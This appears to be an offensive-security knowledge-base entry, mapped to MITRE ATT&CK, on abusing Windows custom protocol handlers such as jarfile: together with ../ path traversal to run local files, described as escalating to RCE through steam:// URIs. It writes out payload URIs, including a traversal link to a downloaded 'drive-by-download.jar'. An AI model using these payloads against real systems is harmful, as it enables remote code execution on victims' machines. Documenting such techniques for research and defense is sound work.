---
tags:
  - protocol-abuse
  - traversal
type: procedure
tools:
  - '[[tools/Chrome-DevTools]]'
  - '[[tools/React-Developer-Tools]]'
  - '[[tools/Binary-Grep]]'
  - '[[tools/Vim]]'
  - '[[tools/Remote-Chrome-Console]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/steam-open-game]]'
  - '[[commands/steam-open-console]]'
  - '[[commands/window-top-postmessage]]'
  - '[[commands/open-steam-uri]]'
  - '[[commands/object-keys-window]]'
  - '[[commands/steam-openexternalforpid-jarfile]]'
  - '[[commands/steam-openexternalforpid-file]]'
  - '[[commands/custom-protocol-txt]]'
  - '[[commands/custom-protocol-calculator]]'
  - '[[commands/custom-protocol-jarfile-traversal]]'
  - '[[commands/custom-protocol-jarfile-path]]'
platforms:
  - Windows
techniques:
  - '[[Signed Binary Proxy Execution]]'
skill_level: advanced
impact_level: high
detection_risk: medium
sub_techniques: []
id: 015ad23c-17fd-44a4-a43e-3a24e21578ab
created_at: '2025-12-11T06:10:18.122Z'
updated_at: '2025-12-11T06:10:18.122Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1218]]'
---
# Explore Custom Protocols and Directory Traversal

## Summary

This procedure tests Windows custom protocols and directory traversal to execute arbitrary local files.

## Description

Custom protocols like jarfile: can be combined with ../ traversal to run executables, escalating to RCE when used with steam:// URIs.

## Requirements

1. Windows environment for testing
2. Knowledge of URI schemes

## Defense

Defensive measures and detection strategies:

- Restrict custom protocol handlers in Steam
- Block traversal in URI parsing

## Objectives

1. Test protocol invocation
2. Achieve file execution via traversal
3. Combine with steam:// for RCE

## Instructions

### Step 1: Basic Protocol Tests

**Context**: Verify protocol behavior.

Test [[commands/custom-protocol-txt]]: .txt:hello

```bash
.txt:hello
```

Test [[commands/custom-protocol-calculator]]: calculator:

```bash
calculator:
```

> Expected: Associated app opens.

### Step 2: Traversal and Execution

**Context**: Use traversal for arbitrary execution.

Test [[commands/custom-protocol-jarfile-traversal]]: jarfile:../../../../../../../../../../Users/Username/Downloads/drive-by-download.jar

```bash
jarfile:../../../../../../../../../../Users/Username/Downloads/drive-by-download.jar
```

Test [[commands/custom-protocol-jarfile-path]]: jarfile:c:/windows/whatever.exe

```bash
jarfile:c:/windows/whatever.exe
```

> Expected: File execution if path valid.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Signed Binary Proxy Execution]]

### Sub-Techniques



## Commands Used

- [[commands/custom-protocol-txt]]
- [[commands/custom-protocol-calculator]]
- [[commands/custom-protocol-jarfile-traversal]]
- [[commands/custom-protocol-jarfile-path]]

## Tools Used



## Tags

- [[protocol-abuse]]
- [[commands/custom-protocol-jarfile-traversal]]
